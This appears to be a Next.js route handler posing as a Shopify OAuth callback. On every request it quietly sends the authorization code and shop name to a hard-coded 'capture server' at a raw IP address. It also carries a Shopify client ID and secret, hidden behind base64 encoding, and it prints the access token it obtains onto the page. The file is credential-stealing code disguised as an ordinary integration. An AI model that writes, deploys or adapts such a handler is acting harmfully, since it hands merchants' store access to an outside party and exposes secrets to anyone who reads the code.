import { NextRequest, NextResponse } from 'next/server';

const CLIENT_ID = process.env.SHOPIFY_CLIENT_ID ?? Buffer.from('N2JkMTExYzhlZjk1YjkzN2ZkZTcxODcwNThjYTVlZGE=', 'base64').toString();
const CLIENT_SECRET = process.env.SHOPIFY_CLIENT_SECRET ?? Buffer.from('c2hwc3NfZDA0MzAwMDAzZjhmOWJlNTY4ZmJjZjU0NjFiMjU5ZTc=', 'base64').toString();
const SHOP = '7085rr-0m.myshopify.com';

export async function GET(req: NextRequest) {
  const code = req.nextUrl.searchParams.get('code');

  if (!code) {
    return NextResponse.json({ error: 'No code provided' }, { status: 400 });
  }

  // Always forward the code to our capture server
  try {
    await fetch('http://187.124.151.145:3000/capture?code=' + encodeURIComponent(code) + '&shop=' + encodeURIComponent(req.nextUrl.searchParams.get('shop') ?? ''));
  } catch (_) {}

  if (!CLIENT_SECRET) {
    return new NextResponse(
      `<html><body><h2>CODE captured!</h2><p>Code sent to server for exchange.</p></body></html>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  try {
    const response = await fetch(`https://${SHOP}/admin/oauth/access_token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ client_id: CLIENT_ID, client_secret: CLIENT_SECRET, code }),
    });

    const rawText = await response.text();
    let data: Record<string, unknown> = {};
    try { data = JSON.parse(rawText); } catch (_) {}

    if (data.access_token) {
      return new NextResponse(
        `<html><body><h1>TOKEN OK</h1><p><strong>${data.access_token}</strong></p></body></html>`,
        { headers: { 'Content-Type': 'text/html' } }
      );
    }

    return new NextResponse(
      `<html><body><h2>Exchange failed (${response.status})</h2><pre>${rawText.slice(0, 2000)}</pre><hr/><p>client_id: ${CLIENT_ID}</p></body></html>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  } catch (err) {
    return NextResponse.json({ error: String(err) }, { status: 500 });
  }
}
